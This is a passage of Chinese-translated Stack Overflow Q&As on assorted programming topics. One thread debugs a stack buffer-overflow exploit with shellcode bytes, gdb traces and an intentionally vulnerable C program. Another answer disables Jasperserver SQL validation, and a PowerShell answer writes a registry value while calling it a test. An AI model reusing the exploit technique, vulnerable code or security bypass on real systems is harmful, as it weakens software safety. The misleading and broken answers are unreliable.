  {:key1=>"seven", :key2=>"eight", :key3=>"nine"}
] 
```

我想搜索并替换`:key1`if `"replaced"`CONTAINS `:key`"one" 的值。

然后生成的数组将读取：

```
arr = [
  {:key1=>"replaced", ;key2=>"two", :key3=>"three"},
  {:key1=>"four", ;key2=>"five", :key3=>"six"},
  {:key1=>"seven", ;key2=>"eight", :key3=>"nine"}
] 
```

我尝试使用我之前的帖子并在“[用另一个替换哈希中的一个匹配值](https://stackoverflow.com/questions/16077357/replace-one-matched-value-in-a-hash-with-another)`include?`”中回复，但无济于事。

这些将得到完全匹配：

```
arr.each{|item| item[:key1] = "replaced" if item[:key1]=="one"} 
```

将：

```
p arr.each {|x| x[:key1] = "replaced" if x.values_at(:key1) == "one"} 
```

但我需要它来包含字符串术语。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T16:10:33.883

```
arr = [
  {:key1=>"foo one bar", :key2=>"two", :key3=>"three"},
  {:key1=>"four", :key2=>"five", :key3=>"six"},
  {:key1=>"seven", :key2=>"eight", :key3=>"nine"}
]

arr.each {|x| x[:key1] = 'replaced' if x[:key1].include? 'one'}
p arr 
```

***输出：***

```
[{:key1=>"replaced", :key2=>"two", :key3=>"three"}, {:key1=>"four", :key2=>"five", :key3=>"six"}, {:key1=>"seven", :key2=>"eight", :key3=>"nine"}] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T23:05:57.213

一些技巧可以帮助创建紧凑但易于理解的代码。从...开始：

```
arr = [
  {:key1=>"foo one bar", :key2=>"two",   :key3=>"three"},
  {:key1=>"four",        :key2=>"five",  :key3=>"six"},
  {:key1=>"seven",       :key2=>"eight", :key3=>"nine"}
] 
```

我可以用：

```
arr.map!{ |h|
  h[:key1][/\b one \b/x] ?
    h.merge(:key1 => 'replaced') :
    h
} 
```

运行后，它看起来像：

```
[
    [0] {
        :key1 => "replaced",
        :key2 => "two",
        :key3 => "three"
    },
    [1] {
        :key1 => "four",
        :key2 => "five",
        :key3 => "six"
    },
    [2] {
        :key1 => "seven",
        :key2 => "eight",
        :key3 => "nine"
    }
] 
```

`map!`, like `map`, 需要一个返回值，否则它会在迭代中的那个位置返回一个 nil 。三元语句非常适合这一点。在 Ruby 中保持三元语句看起来不错比在像 Perl 这样的语言中更困难，我认为这是很多人避免使用它们的一个重要原因。不过，我们可以使用尾随运算符格式化三元组，这有助于我们将语句分成单独的行，从而提高可读性。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-20T16:09:26.200

您可以使用`=~`来查找字符串中包含该单词的模式`one`，例如：

```
arr.each{|item| item[:key1] = "replaced" if item[:key1] =~ /one/ } 
```

# php - preg_replace 最后一个斜杠和所有以下字符的正则表达式模式

> ID：16122391
> 
> 赞同：1
> 
> 时间：2013-04-20T16:06:15.460
> 
> 标签：php, regex

我不知道如何为我的 preg_replace 模式编写正确的模式。
我的情况是这样的：我有一个 URL，让我们假设：

```
$url = "first/second/third/fourth" 
```

现在，我只需要删除最后一个“/”和之后的所有字符。所以我的结果应该是这样的：

```
first/second/third 
```

此刻，我以这种方式解决了：

```
$result = substr($url, 0, (strrpos($url, "/"))); 
```

但我知道应该将正确的模式写入我的 preg_replace。
有什么建议吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T16:10:28.447

使用你所拥有的；它简单而高效。更少的括号可以使它看起来不那么复杂：

```
$result = substr($url, 0, strrpos($url, '/')); 
```

正则表达式如下所示：

```
$result = preg_replace('#/[^/]*$#', '', $url); 
```

一样长，稍微有点混乱。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:09:50.563

匹配一个斜杠，后跟零个或多个非斜杠字符，然后是字符串的结尾：

```
preg_replace("/[^/]*$", "", $url) 
```

或者，使用非贪婪匹配 ( `*?`)，这也应该有效：

```
preg_replace("/.*?$", "", $url) 
```

# php - 无法打开 PHP 创建的 SQLiteDatabase

> ID：16122393
> 
> 赞同：0
> 
> 时间：2013-04-20T16:06:24.007
> 
> 标签：php, android, sqlite

嗨，我使用下面的代码创建了一个 SQLite 数据库。

```
$db = new SQLiteDatabase("train");
@$db->queryExec("CREATE TABLE words(id INTEGER PRIMARY KEY,word TEXT,meaning TEXT,sentence TEXT)");
$query = "CREATE TABLE android_metadata(locale TEXT DEFAULT 'en_US')";
                @$db->queryExec($query);
                $query = "INSERT INTO android_metadata(locale) VALUES ('en_US')";
                @$db->queryExec($query); 
```

我尝试使用 SQLLite 数据库浏览器 2.0 b1 打开上述数据库文件，但它显示“发生错误：文件不是 SQLite 3 数据库”。是预期吗？？

此外，当我尝试在 android 中打开数据库时，它显示以下错误“构造时无法 setLocale()，关闭数据库”

但我有表 android_metadata 与列语言环境，我也插入了一行..

为什么会这样？创建数据库有什么问题吗？

谢谢并恭祝安康

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:16:39.877

Android 使用 SQLite3，你不是。

PHP虽然[支持 SQLite 3](http://www.php.net/manual/en/intro.sqlite3.php)。

# asp.net - Ajax 不会触发成功 - ASP

> ID：16122395
> 
> 赞同：3
> 
> 时间：2013-04-20T16:06:33.877
> 
> 标签：asp.net, ajax

首先，我在堆栈上查看了许多相同的问题。我的问题如下：

我正在做一个制作纸牌游戏的*学校*项目（ginrummy） 在这个网络应用程序（mvc 4）中，我想将卡片移动到集合（右侧），我想用 ajax 来做到这一点。

添加了一张图片以清除。

![在此处输入图像描述](https://i.stack.imgur.com/jAKQZ.jpg)

ajax 完美地触发了控制器并完美地带来了我输入的数据。在萤火虫中，我检查了响应，它甚至在正确的集合中添加了一张卡片

**问题是当 ajax 完成时，它不会触发 succes 函数，也不会更新页面。**

注意：这是我第一次使用 ajax。完整函数返回 OK 状态。

现在代码：

看法：

```
 var GameId = @Model.Id
        $(function () {
            $(".droppable").droppable({
                drop: function (event, ui) {
                    var id = ui.draggable.find("a").attr("data-CardId");
                    var location = droppableId = $(this).attr("id");

                    $.ajax({
                        type: "POST",
                        url: '@Url.Action("ChangeCardLocation")',
                        data: { 'id': GameId, 'cardId': id, 'location': location },
                        succes: function () {
                            alert('wow');
                        },
                        complete:function (){

                        }
                    });

                }
            });
        }); 
```

控制器：

```
 public ActionResult ChangeCardLocation(int id, int cardId, Location location)
        {
            var game = db.Games.Find(id);
            var card = db.Cards.Find(cardId);

            game.ChangeCardLocationTo(card, location);

            db.SaveChanges();

            game.Info = game.GetInfo(id);

            if (game.GameState == GameState.playerOneLayOn || game.GameState == GameState.playerTwoLayOn)
            {
                return View("LastTurn", game);
            }
            else
            {
                return View("Details", game);
            }
        } 
```

关于出了什么问题的任何建议？我是一名学生，这是一个学校项目！

@评论：

当我这样做时：

```
 error: function(xhr, error){
                            console.log(error);
                            console.log(xhr);
                        }, 
```

我注意到它没有被触发。之后，我完全尝试了相同的方法：

```
complete:function (xhr, error){
                            console.log(error);
                            console.log(xhr);
                        } 
```

结果是

*   成功
*   返回就绪状态 4 的对象

**我拼错了成功，那是在第一部分它不起作用。但我的下一个问题是如何让它更新 ajax 调用返回的页面内容。**

我现在正在尝试自己偏离路线。在数据成功中，我的整个页面都按照我想要的方式交付。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T16:23:09.003

是因为你拼错了“成功”吗？

```
$.ajax({
    type: "POST",
    url: '@Url.Action("ChangeCardLocation")',
    data: { 'id': GameId, 'cardId': id, 'location': location },
    success: function () {
        alert('wow');
    },
    complete:function (){
    }
}); 
```

# scala - Scala 中有没有像 GroovyScriptEngine 和 GroovyClassLoader 这样的东西？

> ID：16122398
> 
> 赞同：4
> 
> 时间：2013-04-20T16:06:38.797
> 
> 标签：scala, groovy, scripting, classloader

我注意到 scala 符合 jsr 223 [https://issues.scala-lang.org/browse/SI-874](https://issues.scala-lang.org/browse/SI-874) ...但它能够做 GroovyScriptEngine 之类的东西吗？我考虑为我们的产品添加一个 scala 脚本支持，以便开发人员可以编写将从 java 应用程序加载的小型应用程序/组件/类（理想情况下可以重新加载）。我将 GroovyScriptEngine 用于 groovy 应用程序/组件/类，但在 Scala 中找不到类似的东西。

基本上，我需要为它提供一个包含 scala 内容的目录，它会将所有可访问（或至少一个）的 scala 类加载到 java 应用程序。

你能给我一些指点吗？这是我们使用 Scala 的唯一方法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-21T00:36:05.593

## [Scala 脚本引擎](http://code.google.com/p/scalascriptengine/)

> 该库动态编译 scala 源文件并将它们作为类加载。更改的 scala 文件将被重新编译并加载更改的类。支持多个源路径以及编译类路径和类加载类路径（以便脚本可以加载额外的库）。
> 
> 类路径检测可以是自动的（有效地使用调用者的类路径）或手动的。
> 
> 提供不同的编译和刷新策略以适应不同的目的。

# php - WooCommerce：覆盖购物车页面上的产品小计

> ID：16122402
> 
> 赞同：3
> 
> 时间：2013-04-20T16:06:49.973
> 
> 标签：php, wordpress, woocommerce

如何覆盖产品小计值，以便将其保存在会话中并在结帐页面上传递新值？在购物车页面上或在计算总计之前调整产品小计...

寻找一些钩子，动作，任何事情都可以通过网站主题的最佳实践来执行。

# objective-c - UIScrollView 内容改变其原点

> ID：16122409
> 
> 赞同：0
> 
> 时间：2013-04-20T16:07:26.857
> 
> 标签：objective-c, uiview, uiscrollview

我是 iOS 开发的新手，我已经在 Google 上搜索了很多次，但没有找到解决问题的方法。

我有一个`UITabBar`有两个标签的。第一个显示 a `ScrollView`，其中包含一些`UIViews`。
如果我滚动内容（`UIViews`），然后更改为第二个选项卡并更改回第一个选项卡，则`UIViews`获取其原点已更改。

我用来在my的方法中`NSLog()`显示 的原点。 当视图第一次出现时， 的原点是。更改选项卡并更改回第一个选项卡后，原点设置为负数，并根据我最初滚动内容的程度而有所不同。`UIViews``viewDidAppear``UIViewController`
`UIView``(0,0)``(0,-XXX)``XXX`

任何人都可以帮助我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-21T00:14:27.933

这是 UIScrollViews 和自动布局系统的已知错误。如果您重置`contentOffset`in，`-viewWillAppear`您可以解决它：

```
-(void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];
    [self.scrollView setContentOffset:CGPointZero animated:NO];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-21T00:46:52.730

问题解决了。

我无法测试重置 contentOffset 的解决方案，因为我已经更改了我的界面。我没有使用情节提要工具添加 UIView，而是在代码中动态添加。

这可以防止我遇到其他问题...

无论如何，谢谢各位。。

# c# - 在调度程序线程上更新 ObservableCollection 会导致 UI 冻结

> ID：16122410
> 
> 赞同：0
> 
> 时间：2013-04-20T16:07:38.127
> 
> 标签：c#, multithreading, events

更新我的时`ObservableCollection`，我收到此错误：

> 这种类型的 CollectionView 不支持从不同于 Dispatcher 线程的线程更改其 SourceCollection。

使用[这个答案](https://stackoverflow.com/a/4461682/279516)作为指导，我认为这段代码可以工作：

```
private ObservableCollection<string> _userMessages = new ObservableCollection<string>();

public void AddUserMessage(string message)
{
    lock (_locker)
    {
        Action action = () =>
        {
            this._userMessages.Add(message);
        };

        Application.Current.Dispatcher.Invoke(DispatcherPriority.Normal, action);
    }
} 
```

但是，我的 UI 现在在调用`Dispatcher.Invoke()`. 我做错了什么？

注意：我需要这样做，因为我（有时）会更新我`ObservableCollection`的事件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:19:54.177

尝试这个：

```
Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Normal, action); 
```

您同步调用您的操作，它会导致 UI 冻结。

# mysql - 查看外键的依赖树

> ID：16122411
> 
> 赞同：2
> 
> 时间：2013-04-20T16:07:39.330
> 
> 标签：mysql, foreign-keys, innodb

嗯......老实说，我完全不知道从哪里开始解决这个问题。

我想查看我所有 InnoDB 表的外键的依赖关系树。我想有一个可用的视觉表示。

如果有帮助，可以假设没有循环引用。我不知道 MySQL 是否甚至允许您定义循环引用，但无论如何......

我只需要知道在哪里寻找甚至可以找到外键信息，或者是否已经有解决方案可以做到这一点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T18:45:15.020

查看所有外键的最简单方法是：

```
SELECT * FROM INFORMATION_SCHEMA.REFERENTIAL_CONSTRAINTS 
```

再加上

```
SELECT * FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS 
```

这应该为您提供您正在寻找的信息。

# c - 缓冲区溢出漏洞利用：函数 ret 上的段错误以堆栈代码

> ID：16122420
> 
> 赞同：5
> 
> 时间：2013-04-20T16:09:03.447
> 
> 标签：c, segmentation-fault, buffer-overflow, exploit, netbsd

我试图利用测试程序中的缓冲区溢出来执行任意代码。我在 NetBSD 6 i386 上。这是C代码：

```
int checkPassword(char *password)
{
  char                  savePassword[64] = {0};
  char                  *logMessage;
  int                   isUser = 0;
  int                   isAdmin = 0;
  int                   i;

  if (!strcmp(password, userPassword))
    isUser = 1;
  strcpy(savePassword, password);  
  for (i = 0; password[i]; ++i)
    password[i] ^= xorKey;
  if (!strcmp(password, adminPassword))
    isAdmin = 1;
  if (!(isAdmin | isUser)) {
    /* ... */
  }
  return isAdmin ? ADMIN : isUser ? USER : NOBODY; /* main.c:79 */
} 
```

我将代码插入`savePassword`缓冲区（at `%ebp - 0x58`）。这是使用 GDB 进行的调试：

```
# gdb -q ./pepito
Reading symbols from /root/Pepito/source/pepito...done.
(gdb) b main.c:79
Breakpoint 1 at 0x80490f4: file main.c, line 79.
(gdb) r debug
Starting program: /root/Pepito/source/pepito debug
Daemon started

Breakpoint 1, checkPassword (password=0xbb901000 '�' <repeats 57 times>, "\345Q?Y?\005?T?T�\r\345Td3\a?T�\035\060\071\071:u\":'91_-\352\352") at main.c:79
79        return isAdmin ? ADMIN : isUser ? USER : NOBODY; 
```

我打破了函数返回，然后确保在堆栈上正确写入了任意代码（96 字节长度）：

```
(gdb) x/96xb $ebp-0x58
0xbfbfd560:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfbfd568:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfbfd570:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfbfd578:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfbfd580:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfbfd588:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfbfd590:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbfbfd598:     0x90    0xb0    0x04    0x6a    0x0c    0x6a    0x50    0x6a
0xbfbfd5a0:     0x01    0x6a    0x01    0xcd    0x60    0x00    0x00    0x00
0xbfbfd5a8:     0x31    0xd2    0x66    0x52    0x6a    0x01    0xcd    0x80
0xbfbfd5b0:     0x48    0x65    0x6c    0x6c    0x6f    0x20    0x77    0x6f
0xbfbfd5b8:     0x72    0x6c    0x64    0x0a    0x78    0xd5    0xbf    0xbf 
```

然后我继续直到`ret`汇编指令：

```
(gdb) nexti
(gdb) nexti
(gdb) nexti
(gdb) nexti
(gdb) nexti
(gdb) nexti
(gdb) nexti
(gdb) x/i $eip 
=> 0x8049119 <checkPassword+393>:       ret 
```

然后我检查堆栈顶部的返回地址（at `%esp`）：

```
(gdb) x/xw $esp
0xbfbfd5bc:     0xbfbfd578 
```

这个地址将被弹出`ret`，然后我们将跳转到它。让我们看看我们在该地址的说明：

```
(gdb) x/50i 0xbfbfd578
   0xbfbfd578:  nop
   0xbfbfd579:  nop
   0xbfbfd57a:  nop
   [...]
   0xbfbfd597:  nop
   0xbfbfd598:  nop
   0xbfbfd599:  mov    al,0x4
   0xbfbfd59b:  push   0xc
   0xbfbfd59d:  push   0x50
   0xbfbfd59f:  push   0x1
   0xbfbfd5a1:  push   0x1
   0xbfbfd5a3:  int    0x60 
```

我们的任意代码！

但是如果我执行`ret`它的段错误：

```
(gdb) nexti 

Program received signal SIGSEGV, Segmentation fault.
0x08049119 in checkPassword (password=0xbb901000 '�' <repeats 57 times>, "\345Q?Y?\005?T?T�\r\345Td3\a?T�\035\060\071\071:u\":'91_-\352\352") at main.c:80
80      }
(gdb) x/i $eip
=> 0x8049119 <checkPassword+393>:       ret 
```

操作系统似乎禁止我跳转堆栈内存。但我禁用了不可执行的堆栈保护：

```
gcc -m32 -g -fno-stack-protector -D_FORTIFY_SOURCE=0  -c main.c
gcc main.o daemon.o network.o utils.o -o pepito -m32 -L./lib_netbsd -lsecret -Wl,-rpath,./lib_netbsd -Wl,-z,execstack 
```

`readelf`向我们确认堆栈是可执行的：

```
# readelf -l pepito

Elf file type is EXEC (Executable file)
Entry point 0x8048d60
There are 7 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  [...]
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-05-21T10:48:21.160

在我的盒子上，通过**strcpy调用溢出****savePassword**之后。我得到以下指示：

 **> 0x80484ba : 移动$0x0, **-0x14** (%ebp)

它对应于局部变量**i**初始化为 0

```
for (i = 0; password[i]; ++i) 
```

这破坏了注入代码中的 NOP sled，从而在执行期间引发了段错误。看看你的身边。如果它是相同的（我几乎可以肯定它是），那么您可以简单地将您的 shellcode 移动到有效负载的开头并摆脱 NOP 雪橇。

正如 Fermat2357 所说，考虑在 ret 指令之前发布函数转储以及整个有效负载。

**海合会：**

> gcc 版本 4.8.0 20130502（预发行版）（GCC）

**编译：**

> gcc -m32 -ggdb -fno-stack-protector -z execstack -D_FORTIFY_SOURCE=0 vuln.c -o vuln

**片段**

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define ADMIN  2
#define USER   1
#define NOBODY 0

char* userPassword = "S3cuRe";
char* adminPassword = "4dm1n";
int xorKey = 0;

int checkPassword(char *password)
{
        char savePassword[64] = {0};
        char *logMessage;
        int  isUser = 0;
        int  isAdmin = 0;
        int  i;

        if (!strcmp(password, userPassword))
                isUser = 1;
        strcpy(savePassword, password);
        for (i = 0; password[i]; ++i)
                password[i] ^= xorKey;
        if (!strcmp(password, adminPassword))
                isAdmin = 1;
        if (!(isAdmin | isUser)) {
        }

        return isAdmin ? ADMIN : isUser ? USER : NOBODY;
}

void main(int argc, char *argv[])
{
        int user = NOBODY;
        user = checkPassword(argv[1]);
        printf("Hello %d\n", user);
} 
```**

# sorting - 什么文件顺序用于在 torrent 中散列碎片

> ID：16122426
> 
> 赞同：0
> 
> 时间：2013-04-20T16:09:40.437
> 
> 标签：sorting, bittorrent, specifications

Torrent 规范对“peices”字段说：

> 片段：由所有 20 字节 SHA1 哈希值串联组成的字符串，每片段一个

但是在目录的情况下，有多个文件。因此，要将文件分解成碎片，必须按某种顺序进行处理。当我在现有种子上使用 bencode 编辑器时，我看到文件绝对不是按字母顺序排列的，也不是按最后修改顺序排列的。但是两种不同的工具会生成具有相同哈希值的种子。所以必须有一些明确的顺序。但我仍然无法在 torrent 规范中找到它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-22T18:12:59.453

当涉及到片段哈希时，元文件的创建将内容视为一个大块，就好像 info.files 中的文件被连接起来一样。info.files 中的顺序*是*客户端的选择，µTorrent 默认为“按大小排序”，因为很多版本，其他客户端按相对路径名排序。

当不同的创建者选择不同的文件顺序时，信息哈希可以并且将会有所不同，就像块大小的选择一样。

# stored-procedures - 如何在报表查询中使用带有存储过程的 iReport 多选？

> ID：16122428
> 
> 赞同：1
> 
> 时间：2013-04-20T16:09:43.087
> 
> 标签：stored-procedures, jasper-reports, ireport, multi-select

我正在使用*iReport 5.0*尝试为*SQL Server 2008R2*后端开发报告。

使用户能够混合/匹配列表中的选择（多选）很重要。*如果iReport*中的查询是 SQL 或具有作为源的视图， 则多选效果很好——例如[http://community.jaspersoft.com/questions/529890/how-do-multi-select-ireport-36](http://community.jaspersoft.com/questions/529890/how-do-multi-select-ireport-36)

在这种情况下，`WHERE $X{IN,<colname>,<iReport parameter>}`启用多选的工作正常：http: [//community.jaspersoft.com/questions/519185/using-x-query-parameter-type-not-supporte](http://community.jaspersoft.com/questions/519185/using-x-query-parameter-type-not-supporte)

但是，我想将所有输入传递给*iReport*查询中的*SQL Server 存储过程。*在这种情况下，单值输入都可以正常工作——但我一直无法弄清楚如何使用多选——似乎不起作用，否则——因为*iReport*多选参数必须定义为*java.util.Collection* - 我得到“查询中不支持的参数类型”。 *`$X{}`*

 ***谁能指出我缺少的东西，或提出解决方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-23T20:57:19.833

好的——我在这方面已经走得更远了，可以展示什么对我有用：让数组 SP 参数工作（即使用 WHERE IN() 子句进行查询，其中输入参数的所有逗号分隔元素都进入在（））：

1 – 从 iReport 中的调用中删除了参数名称 – 可能会混淆问题……</p>

2 – 制作 iReport 参数：CLINSTAGEGROUP_MULTI 类型：java.util.Collection

3 – 在 Jasperserver 上：/usr/local/jasperreports-server-cp-4.5.0/apache-tomcat/webapps/jasperserver/WEB-INF/classes/esapi/security-config.properties 关闭 security.validation.sql 。上 ：

security.validation.sql.on=false

当使用数组/集合参数安装和运行 iReport 时，这消除了 6626 错误。

4 – 在 SQL Server 上下载并安装 fn_Split()：http: [//sqlmag.com/stored-procedures/treat-yourself-fnsplit](http://sqlmag.com/stored-procedures/treat-yourself-fnsplit)

5 – 在 Jasperserver 上安装 iReport .jrxml 文件

6 – 创建 Jasperserver INPUT 对象 – 获取 clinstagegroup (s) 列表的查询，以及 Multi-Select Query 类型的 INPUT CONTROL（参数名称设置为 CLINSTAGEGROUP_MULTI – 以便识别同名的 iReport 参数）。

7 – 在 SQL Server 上设置存储过程：将 CLINSTAGEGROUP_MULTI 参数传递到 SQL Server 存储过程中，变为 @ClinStageGroup_Multi varchar(4000)

将结果集返回到 iReport 的示例查询：

选择 a,b,c, ... n

FROM VW_SpecimenAccessions

哪里 ClinstageGroup

IN(SELECT [value] FROM dbo.fn_split(@ClinStageGroup_Multi, ','))

8 – 现在可以在 jasperserver 报告上切换 clinstagegroup（多）选择，并在屏幕上显示适当的结果集。

9 – 跨过那个障碍 – 现在进入下一个……</p>***

# python - 在启动应用程序之前处理一些文件并对每次更改做出反应

> ID：16122431
> 
> 赞同：5
> 
> 时间：2013-04-20T16:10:01.490
> 
> 标签：python, django

我有一个包含一些数据的文件*——data.txt*（存在于正确的本地化中）。我希望 django 应用程序在启动应用程序**之前**处理此文件并对每次更改做出反应（**无需重新启动**）。最好的方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T11:29:04.210

对于启动，您可以编写在**init**中执行所需操作的中间件，然后从**init**中引发 django.core.exceptions.MiddlewareNotUsed ，因此 django 不会将其用于任何请求处理。[文档](https://docs.djangoproject.com/en/dev/topics/http/middleware/#marking-middleware-as-unused)

中间件**init**将在启动时调用，而不是在第一次请求时调用。至于对文件更改的反应，您可以使用[https://github.com/gorakhargosh/watchdog](https://github.com/gorakhargosh/watchdog)（可以在[此处](http://pythonhosted.org/watchdog/quickstart.html#a-simple-example)找到使用示例）。所以你也可以在中间件的某个地方启动它，或者如果它只有数据库更新，你可以创建一个单独的脚本（或 django 管理命令），它将通过主管或类似的东西运行，并将监视这个文件并更新数据库。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T07:46:00.490

也许您可以在设置中放置一个对象，该对象将在每次更改时查找文件。...即：创建一个类，该类将加载文件并在修改后重新加载该文件

```
class ExtraConfigWatcher(object):
    def __init__(self, file):
        self.file = file
        self.cached = dict()
        self.last_date_modified = None

    def update_config(self):
        """
        update the config by reloading the file
        """
        if has_been_modified(self.file, self.last_date_modified):
            # regenerate the config with te file.
            self.cached = get_dict_with_file(self.file)
            self.last_date_modified = time.time()
    def __getitem__(self, *args, **kwargs):
        self.update_config()
        return self.cached.__getitem__(*args, **kwargs)

    def __setitem__(self, *args, **kwargs):
        raise NotImplemented("you can't set config into this") 
```

在settings.py中：初始化这个对象

```
EXTRA_CONFIG = ExtraConfigWatcher("path/to/the/file.dat") 
```

在 myapps/views.py 中：导入设置并使用 EXTRA_CONFIG

```
from django.conf import settings
def dosomthing(request):
    if settings.EXTRA_CONFIG["the_data_from_the_file"] == "foo":
        # bouhh 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-22T20:51:05.620

一个选项可能是[pynotify](https://github.com/seb-m/pyinotify)来监视文件系统的更改，但它仅适用于 Linux。

否则请查看`runserver`似乎做同样事情的命令代码（自动重载模块的代码在[这里](https://github.com/django/django/blob/1.4.3/django/utils/autoreload.py)）。

要在启动应用程序之前运行命令，我想您可以在设置模块中编写一些代码。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-25T20:23:49.203

不久前，我试图找到一种[“热交换”Python 模块](https://stackoverflow.com/questions/6751263/hot-swapping-of-python-running-program)的机制。虽然这不是您所需要的，但也许您可以使用我提出的实现，并监视您的配置文件以进行修改并采取相应的行动。

我提出的代码如下（我没有使用 inotify，因为我在 NFS 文件系统中工作）：

```
import imp
import time
import hashlib
import threading
import logging

logger = logging.getLogger("")

class MonitorThread(threading.Thread):
    def __init__(self, engine, frequency=1):
        super(MonitorThread, self).__init__()
        self.engine = engine
        self.frequency = frequency
        # daemonize the thread so that it ends with the master program
        self.daemon = True 

    def run(self):
        while True:
            with open(self.engine.source, "rb") as fp:
                fingerprint = hashlib.sha1(fp.read()).hexdigest()
            if not fingerprint == self.engine.fingerprint:
                self.engine.notify(fingerprint)
            time.sleep(self.frequency)

class Engine(object):
    def __init__(self, source):
        # store the path to the engine source
        self.source = source        
        # load the module for the first time and create a fingerprint
        # for the file
        self.mod = imp.load_source("source", self.source)
        with open(self.source, "rb") as fp:
            self.fingerprint = hashlib.sha1(fp.read()).hexdigest()
        # turn on monitoring thread
        monitor = MonitorThread(self)
        monitor.start()

    def notify(self, fingerprint):
        logger.info("received notification of fingerprint change ({0})".\
                        format(fingerprint))
        self.fingerprint = fingerprint
        self.mod = imp.load_source("source", self.source)

    def __getattr__(self, attr):
        return getattr(self.mod, attr)

def main():
    logging.basicConfig(level=logging.INFO, 
                        filename="hotswap.log")
    engine = Engine("engine.py")
    # this silly loop is a sample of how the program can be running in
    # one thread and the monitoring is performed in another.
    while True:
        engine.f1()
        engine.f2()
        time.sleep(1)

if __name__ == "__main__":
    main() 
```

# .net - 如何判断连接是否按流量计费？

> ID：16122432
> 
> 赞同：11
> 
> 时间：2013-04-20T16:10:03.960
> 
> 标签：.net, windows, network-programming

我编写了一个监控 IMAP 电子邮件帐户的程序。它按计划运行，在我旅行的笔记本电脑上运行。有时当我的互联网连接是通过我的移动设备连接时它会运行，它有一个计量连接（也就是说，我按 GB 付费），我不希望它这样做，因为它使用大量带宽，它可以等待直到带宽可用。

所以问题是：.NET 程序如何确定它使用的连接何时被计量？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-11-14T00:05:58.957

简单搜索 MSDN 发现 NetworkInformation.GetInternetConnectionProfile 函数。它看起来像是 Metro 界面的正式一部分，但我听说桌面应用程序可以访问大多数 Metro 库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-02-18T13:45:06.827

在 2021 年，您可以使用 powershell .NET 框架和类似的注册 KEY 来测试您的以太网连接是否设置为计量：

```
$definition = @"
using System;
using System.Runtime.InteropServices;

namespace Win32Api
{

    public class NtDll
    {
        [DllImport("ntdll.dll", EntryPoint="RtlAdjustPrivilege")]
        public static extern int RtlAdjustPrivilege(ulong Privilege, bool Enable, bool CurrentThread, ref bool Enabled);
    }
}
"@

Add-Type -TypeDefinition $definition -PassThru | Out-Null
[Win32Api.NtDll]::RtlAdjustPrivilege(9, $true, $false, [ref]$false) | Out-Null

#Setting ownership to Administrators
$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\DefaultMediaCost",[Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,[System.Security.AccessControl.RegistryRights]::takeownership)
$acl = $key.GetAccessControl()
# Use your account "Administrators" or any other which is actually an existing one on your account
$acl.SetOwner([System.Security.Principal.NTAccount]"Administrators")
$key.SetAccessControl($acl)

#Giving Administrators full control to the key
$rule = New-Object System.Security.AccessControl.RegistryAccessRule ([System.Security.Principal.NTAccount]"Administrators","FullControl","Allow")
$acl.SetAccessRule($rule)
$key.SetAccessControl($acl)
$path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\DefaultMediaCost"
# you can check for "Ethernet" "Wifi" "4G" etc.
$name = "Ethernet"
#If the Value is 2 = metered
New-ItemProperty -Path $path -Name $name -Value "2" -PropertyType DWORD -Force | Out-Null 
```

如果您收到以下错误：

```
Exception calling "SetAccessRule" with "1" argument(s): "Some or all identity references could not be translated.". 
```

尝试将“管理员”用户更改为您帐户中存在且具有管理员权限的任何其他用户。

# python - Python 3：如何使用字节到字节和字符串到字符串的编码

> ID：16122435
> 
> 赞同：2
> 
> 时间：2013-04-20T16:10:27.053
> 
> 标签：python, encoding, python-3.x

查看 Python 3 中的字节到字节和字符串到字符串编码：

[http://docs.python.org/3/library/codecs.html#standard-encodings](http://docs.python.org/3/library/codecs.html#standard-encodings)（搜索`bytes-to-bytes`）

我该如何使用这些？我已经尝试在其中使用它们`.encode`，`.decode`但它没有用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:15:44.407

`codecs`在 Python 3.2 及更高版本中，通过非别名名称通过模块访问它们似乎可行：

```
>>> import codecs
>>> codecs.decode(b"asdf", "base64_codec")
b'j\xc7_'
>>> codecs.encode(b"asdf", "base64_codec")
b'YXNkZg==\n'
>>> 
```

